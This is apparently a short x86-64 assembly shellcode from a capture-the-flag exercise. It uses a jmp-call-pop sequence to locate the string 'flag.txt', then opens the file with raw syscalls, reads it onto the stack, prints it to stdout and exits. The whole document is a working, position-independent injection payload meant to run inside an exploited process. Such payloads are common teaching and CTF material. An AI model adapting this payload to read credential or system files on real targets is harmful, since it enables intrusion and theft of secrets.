.intel_syntax noprefix
.globl _start
_start:
    jmp  call_it
start:
    pop  rdi
    xor  esi, esi
    xor  edx, edx
    mov  eax, 2
    syscall
    mov  edi, eax
    lea  rsi, [rsp-0x400]
    mov  edx, 0x100
    xor  eax, eax
    syscall
    mov  edx, eax
    mov  edi, 1
    mov  eax, 1
    syscall
    xor  edi, edi
    mov  eax, 60
    syscall
call_it:
    call start
    .ascii "flag.txt\0"
